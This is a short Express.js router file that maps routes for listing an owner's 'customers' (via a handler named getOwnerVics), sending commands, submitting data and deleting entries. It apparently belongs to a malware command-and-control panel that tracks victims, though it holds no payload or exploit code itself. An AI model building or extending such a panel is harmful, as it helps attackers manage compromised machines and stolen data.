const express = require("express");
const {
	getOwnerVics,
	command,
	getInfo,
	submitData,
	deleteEntry,
} = require("../controllers/panelController");

const router = express.Router();

router.get("/customers/:owner", getOwnerVics);
router.post("/command", command);
router.get("/customers/id/:uniqueid", getInfo);
router.post("/data", submitData);
router.post("/delete", deleteEntry);

module.exports = router;
